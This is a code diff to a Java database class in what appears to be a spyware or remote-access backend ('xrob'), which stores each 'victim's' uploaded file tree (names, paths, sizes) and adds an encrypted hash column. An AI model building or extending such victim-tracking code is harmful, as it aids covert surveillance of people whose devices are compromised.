@@ -3,6 +3,7 @@ package com.theah64.xrob.api.database.tables;
 import com.sun.istack.internal.Nullable;
 import com.theah64.xrob.api.database.Connection;
 import com.theah64.xrob.api.models.File;
+import com.theah64.xrob.api.utils.DarKnight;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -19,11 +20,14 @@ import java.util.List;
 public class Files extends BaseTable<File> {
 
     private static final String COLUMN_FILE_NAME = "file_name";
-    private static final String COLUMN_PARENT_ID = "parent_id";
+    public static final String COLUMN_PARENT_ID = "parent_id";
     private static final String COLUMN_IS_DIRECTORY = "is_directory";
     private static final String COLUMN_FILE_SIZE_IN_KB = "file_size_in_kb";
     private static final String COLUMN_ABSOLUTE_PARENT_PATH = "absolute_parent_path";
     private static final String ABSOLUTE_ROOT = "/";
+    public static final String COLUMN_FILE_ID = "file_id";
+    public static final String COLUMN_FILE_HASH = "file_hash";
+    private static final String TABLE_NAME_FILES = "files";
 
     private Files() {
     }
@@ -36,12 +40,12 @@ public class Files extends BaseTable<File> {
 
     @Override
     public void addv2(@Nullable String victimId, JSONArray jaFiles) throws RuntimeException, JSONException {
-        final String query = "INSERT INTO files (victim_id,file_id,absolute_parent_path,file_name,parent_id,is_directory,file_size_in_kb) VALUES (?,?,?,?,?,?,?);";
+        final String query = "INSERT INTO files (victim_id,file_id,absolute_parent_path,file_name,parent_id,is_directory,file_size_in_kb,file_hash) VALUES (?,?,?,?,?,?,?,?);";
         final java.sql.Connection con = Connection.getConnection();
         try {
             final PreparedStatement ps = con.prepareStatement(query);
             ps.setString(1, victimId);
-            insert(ps, ABSOLUTE_ROOT, "0", jaFiles);
+            insert(ps, ABSOLUTE_ROOT, "0", jaFiles, victimId);
             ps.close();
         } catch (SQLException e) {
             e.printStackTrace();
@@ -54,7 +58,8 @@ public class Files extends BaseTable<File> {
         }
     }
 
-    private void insert(PreparedStatement ps, String absoluteParentPath, final String parentId, JSONArray jaFiles) throws JSONException, SQLException {
+    private void insert(PreparedStatement ps, String absoluteParentPath, final String parentId, JSONArray jaFiles, String victimId) throws JSONException, SQLException {
+
 
         for (int i = 0; i < jaFiles.length(); i++) {
 
@@ -63,7 +68,8 @@ public class Files extends BaseTable<File> {
             final String name = joFile.getString("name");
             final long size = joFile.getLong("size");
             final boolean isDirectory = joFile.has("files");
-            absoluteParentPath = absoluteParentPath + name;
+
+            System.out.println(name);
 
 
             ps.setString(2, id);
@@ -72,6 +78,7 @@ public class Files extends BaseTable<File> {
             ps.setString(5, parentId);
             ps.setBoolean(6, isDirectory);
             ps.setLong(7, size);
+            ps.setString(8, DarKnight.getEncrypted(victimId + absoluteParentPath + name + isDirectory + size).replaceAll("/", "~"));
 
             if (ps.executeUpdate() != 1) {
                 throw new SQLException("Failed to add file");
@@ -79,20 +86,26 @@ public class Files extends BaseTable<File> {
 
             if (isDirectory) {
                 final JSONArray jaFiles2 = joFile.getJSONArray("files");
+
                 if (jaFiles.length() > 0) {
-                    insert(ps, absoluteParentPath, id, jaFiles2);
-                    absoluteParentPath = ABSOLUTE_ROOT;
+
+                    String parentPath;
+                    if (absoluteParentPath.equals(ABSOLUTE_ROOT)) {
+                        parentPath = ABSOLUTE_ROOT + name;
+                    } else {
+                        parentPath = absoluteParentPath + "/" + name;
+                    }
+
+                    insert(ps, parentPath, id, jaFiles2, victimId);
                 }
             }
-
-
         }
     }
 
     @Override
     public List<File> getAll(String victimId, String fileParentId) {
         List<File> files = null;
-        final String query = " SELECT id,file_name,absolute_parent_path,file_size_in_kb, is_directory FROM files WHERE victim_id = ? AND parent_id = ? AND is_active =1;";
+        final String query = " SELECT file_id,file_name,absolute_parent_path,file_size_in_kb, is_directory,file_hash FROM files WHERE victim_id = ? AND parent_id = ? AND is_active =1;";
         final java.sql.Connection con = Connection.getConnection();
         try {
             final PreparedStatement ps = con.prepareStatement(query);
@@ -103,14 +116,14 @@ public class Files extends BaseTable<File> {
             if (rs.first()) {
                 files = new ArrayList<>();
                 do {
-                    final String id = rs.getString(COLUMN_ID);
+                    final String fileId = rs.getString(COLUMN_FILE_ID);
                     final String fileName = rs.getString(COLUMN_FILE_NAME);
                     final String absoluteParentPath = rs.getString(COLUMN_ABSOLUTE_PARENT_PATH);
                     final String fileSizeInKB = rs.getString(COLUMN_FILE_SIZE_IN_KB);
                     final boolean isDirectory = rs.getBoolean(COLUMN_IS_DIRECTORY);
+                    final String fileHash = rs.getString(COLUMN_FILE_HASH);
 
-
-                    files.add(new File(id, fileName, absoluteParentPath, fileSizeInKB, isDirectory));
+                    files.add(new File(fileId, fileName, absoluteParentPath, fileSizeInKB, fileHash, isDirectory));
                 } while (rs.next());
             }
 
@@ -127,5 +140,10 @@ public class Files extends BaseTable<File> {
             }
         }
         return files;
+    }
+
+    @Override
+    public String get(String byColumn, String byValues, String columnToReturn) {
+        return super.getV2(TABLE_NAME_FILES, byColumn, byValues, columnToReturn);
     }
 }
